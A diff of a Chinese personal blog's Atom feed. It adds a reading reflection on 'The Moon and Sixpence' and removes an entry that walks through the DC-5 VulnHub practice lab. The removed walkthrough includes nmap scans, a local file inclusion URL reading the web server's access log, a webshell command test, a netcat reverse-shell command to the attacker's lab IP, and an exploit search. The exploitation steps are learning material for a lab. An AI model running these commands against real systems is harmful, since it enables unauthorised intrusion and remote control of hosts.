@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://ckcah.github.io/"/>
-  <updated>2020-08-15T07:04:23.623Z</updated>
+  <updated>2020-09-04T12:21:55.467Z</updated>
   <id>https://ckcah.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>月亮与六便士第一遍观后感</title>
+    <link href="https://ckcah.github.io/2020/09/05/%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB%E7%AC%AC%E4%B8%80%E9%81%8D%E8%A7%82%E5%90%8E%E6%84%9F/"/>
+    <id>https://ckcah.github.io/2020/09/05/%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB%E7%AC%AC%E4%B8%80%E9%81%8D%E8%A7%82%E5%90%8E%E6%84%9F/</id>
+    <published>2020-09-05T00:20:13.000Z</published>
+    <updated>2020-09-04T12:21:55.467Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在机场的时候去早了很无聊，然后就找了个书店，买的其中一本书《月亮与六便士》</p><p>这本书很短，至少翻译出来很短，而且，原文是法文，所以翻译出来可能有些许翻译者自带的情绪和理解。我读的版本是苏福忠译。说来惭愧，英语太烂，不能全文通读。希望第二遍有这个机会写一篇英文观后感。</p><p>这本书，倒也不是给我很深的感觉，大概，在我的理解范围之内，也在我的理解范围之外。查尔斯的性格、德克的包容、“我”的交往方式、还有德克妻子的举动、查尔斯最后一任妻子的执着，都是我不理解的，但也是我能理解。</p><p>我其实很能理解查尔斯的背弃家庭追求向往已久的画家生活，哪怕是那么穷困潦倒不切实际，但是，至少，他有那个勇气，他的心灵和灵魂，是超乎常理的，他根本不把生死看在眼里，也不会在意周围的环境，他只是在追求自己想要的东西，甚至到了最后，得了该死的疾病，也还是不舍弃的在画画。我是没有那个勇气的，但和他相同的，我也有自己想要搞清楚的事情，只是一直表达不出来。在内心深处，我也想要不顾及所有人的一切来找寻某个东西。我能理解他的无情。我是一个常人，光是从考虑其他人的感受来说，我和德克一样，有一个多管闲事的“圣母心”，无法摆脱。我在读书的时候，会试着去进入某一个角色感受某一件事情，于是，我进入状态感受了德克在被妻子抛弃，被自己认为是天才的人无视的感觉，如果是我，我会很愤怒也很绝望，甚至会和德克一样一次又一次的去找妻子，会很憎恨查尔斯，会不再和他来往。但最后德克在离开法国准备回家的时候，却邀请查尔斯的时候，我，是不能理解的，我也不知道，自己会不会原谅他，就算是出于对天才的怜惜，我想我也会犹豫很久。</p><p>从外人的角度来看查尔斯，我很讨厌很讨厌他。但如果将自己代入查尔斯，却又是一件很舒服的事情，各个方面。我无法描述太多，那是一种特别的感觉，让我贪婪的觉得，如果我也如此该多好。可惜我不是天才，我得不到德克的追捧，也没有他第三任妻子的忠诚，更不能摆脱家庭。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
+      
+    
+    </summary>
+    
+    
+      <category term="观后感" scheme="https://ckcah.github.io/categories/%E8%A7%82%E5%90%8E%E6%84%9F/"/>
+    
+    
+      <category term="文学" scheme="https://ckcah.github.io/tags/%E6%96%87%E5%AD%A6/"/>
+    
+  </entry>
   
   <entry>
     <title>shiro复现报告</title>
@@ -517,34 +543,6 @@
       <category term="目录遍历" scheme="https://ckcah.github.io/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
     
       <category term="远程命令执行" scheme="https://ckcah.github.io/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DC-5</title>
-    <link href="https://ckcah.github.io/2020/05/14/DC-5%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/"/>
-    <id>https://ckcah.github.io/2020/05/14/DC-5%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</id>
-    <published>2020-05-14T09:36:20.000Z</published>
-    <updated>2020-05-14T22:12:56.000Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 192.168.114.0&#x2F;24</span><br><span class="line"></span><br><span class="line">nmap -A -T 4 192.168.114.146</span><br></pre></td></tr></table></figure><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C1.png" alt="image-20200514054055039"></p><p>特地查了一下rpcbind，大概是将RPC服务映射到其侦听的端口的服务，和DNS类似。</p><p><strong>rpcbind [3]实用程序将RPC服务映射到其侦听的端口。RPC进程在启动时会通知rpcbind，注册正在侦听的端口以及期望使用的RPC程序号。然后，客户端系统使用特定的RPC程序服务器与服务器上的rpcbind联系。rpcbind服务重新设置客户端重定向到正确的端口号，刹车它可以与请求的服务进行通信</strong></p><p>80端口也是打开的，先试试从80端口入手</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C2.png" alt="image-20200514054437764"></p><p>wappalyzer只检测出它是php编写的，以及服务器是nginx。</p><p>访问contact的时候，发现有一个留言功能，或许可以试试xss</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C3.png" alt="image-20200514054556665"></p><p>burp跑了字典，不行</p><p>试试跑目录，什么都没跑出来</p><p>sql注入，试了几个原始头参数，没用</p><p>实在没办法了，还是乖乖的去看<a href="https://www.hackingarticles.in/dc-5-vulnhub-walkthrough/" target="_blank" rel="noopener">大佬</a>文章学知识吧</p><p>作者提到，当我们提交contact表单时，下边的logo会从2019变成2020</p><p>未提交前：</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C4.png" alt="image-20200514064408110"></p><p>提交后：</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C5.png" alt="image-20200514064453517"></p><p>测试了很久发现是LFI漏洞</p><p>其实首页就已经提示了是本地文件包含漏洞</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C6.png" alt="image-20200514064800357"></p><p>用/etc/passwd测试，存在LFI漏洞</p><p>按理来说，像数据库日志文件，登陆日志文件，访问日志文件，linux的话，都在/var下，那就直接去看看access文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.114.133&#x2F;thankyou.php?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C7.png" alt="image-20200514065353784"></p><p>学到一个新知识</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C8.png" alt="image-20200514065332937"></p><p>这样插入一句话木马的，我还是第一次见</p><p>提交成功</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C9.png" alt="image-20200514065419432"></p><p>验证一下cmd是否可以执行，给cmd一个parameter，用<strong>&amp;cmd=id</strong></p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C10.png" alt="image-20200514065734341"></p><p>全局搜索一下<code>uid</code></p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C11.png" alt="image-20200514065546988"></p><p>请出<code>netcat</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash 192.168.114.1 1234</span><br><span class="line"></span><br><span class="line">192.168.114.1为攻击机IP地址</span><br></pre></td></tr></table></figure><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C12.png" alt="image-20200514070835769"></p><p>再在本地执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>奇怪的是，我在windows下怎么做都不成功</p><p>所以只好切换成kali</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C13.png" alt="image-20200514071554470"></p><p>然后</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C14.png" alt="image-20200514071803007"></p><p>不太知道这是什么，查了下</p><p><strong>2&gt;/dev/null</strong></p><p>2是错误输出</p><p>/dev/null 代表 linux 的空设备文件</p><p>2&gt;/dev/null 意思就是把错误输出到“黑洞” ，也就是空文件中</p><p>锁定目标screen-4.5.0，我的理解是个程序之类的东西，</p><p>kali自带漏洞搜索，那就查查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen</span><br></pre></td></tr></table></figure><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C15.png" alt="image-20200514072553731"></p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C16.png" alt="image-20200514072616966"></p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C17.png" alt="image-20200514072646869"></p><p>接下来就是漏洞利用</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C18.png" alt="image-20200514072742399"></p><p>好像不太行得通</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C19.png" alt="image-20200514073252130"></p><p>试试另一个41154.sh</p><p><img src="D:%5CBlog%5Cblog%5Csource%5Cimages%5CDC-5%5C20.png" alt="image-20200514073444042"></p><p>提权未成功</p><p>再议</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>要细心观察每一个地方的变化</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
-      
-    
-    </summary>
-    
-    
-      <category term="kali" scheme="https://ckcah.github.io/categories/kali/"/>
-    
-      <category term="内网渗透" scheme="https://ckcah.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="vulnhub" scheme="https://ckcah.github.io/tags/vulnhub/"/>
     
   </entry>
   
